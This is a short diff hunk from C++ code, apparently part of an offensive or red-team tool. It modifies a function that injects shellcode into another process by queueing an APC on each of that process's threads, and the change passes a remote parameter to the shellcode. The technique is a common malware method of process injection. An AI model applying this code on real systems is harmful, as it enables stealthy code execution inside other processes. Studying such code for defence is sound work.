@@ -207,7 +207,7 @@ void inject_shellcode_by_id_apc(rust::u32 pid, rust::Vec<rust::u8> shellcode,
     if (te.th32OwnerProcessID == pid) {
       HANDLE thread = OpenThread(THREAD_ALL_ACCESS, NULL, te.th32ThreadID);
       QueueUserAPC((PAPCFUNC)((uintptr_t)remote_shellcode + ep_offset), thread,
-                   NULL);
+                   (ULONG_PTR)remote_parameter);
       CloseHandle(thread);
     }
   }
